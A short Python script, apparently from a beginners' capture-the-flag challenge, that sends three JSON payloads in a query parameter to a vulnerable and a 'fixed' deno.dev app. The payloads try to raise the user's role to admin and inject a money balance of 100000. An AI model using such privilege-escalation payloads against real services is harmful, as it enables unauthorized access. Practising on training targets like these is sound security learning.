import requests

payloads = [
    '{ "role": "user" }',
    '{ "role": "admin" }',
    '{ "user": { "money": 100000, "flags": [] }, "role": "admin" }'
]

urls = [
    "https://x-beginnerslive2023.deno.dev",
    "https://x-beginnerslive2023-fixed.deno.dev"
]

for url in urls:
    print("===", url, "===")
    for payload in payloads:
        r = requests.get(url, params={"q": payload})
        print(r.text)
    print()